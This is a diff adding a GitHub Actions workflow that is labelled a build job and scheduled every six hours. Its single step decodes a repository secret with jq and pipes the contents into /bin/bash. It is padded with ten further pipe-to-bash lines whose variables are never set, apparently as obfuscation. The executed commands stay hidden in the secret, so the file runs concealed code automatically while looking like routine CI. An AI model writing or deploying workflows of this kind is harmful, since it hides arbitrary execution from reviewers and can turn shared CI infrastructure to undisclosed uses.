@@ -1,0 +1,29 @@
+name: zhuanmopangdu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuanmopangdu
+        env:
+          epjou306: ${{ secrets.epjou306 }}
+        run: |
+          echo $epjou306 | jq -r .legoq7691 | /bin/bash
+          echo $rngp48 | jq -r .pixdt61564 | /bin/bash
+          echo $ji48 | jq -r .lfq860 | /bin/bash
+          echo $qav8 | jq -r .wfem4 | /bin/bash
+          echo $qj5 | jq -r .wuk8 | /bin/bash
+          echo $azt09 | jq -r .uvi3 | /bin/bash
+          echo $srtk41781 | jq -r .etgxl71155 | /bin/bash
+          echo $b3790 | jq -r .es7 | /bin/bash
+          echo $yw0 | jq -r .uar544 | /bin/bash
+          echo $ij6488 | jq -r .icemi4708 | /bin/bash
+          echo $lvwx320 | jq -r .yq1277 | /bin/bash
+
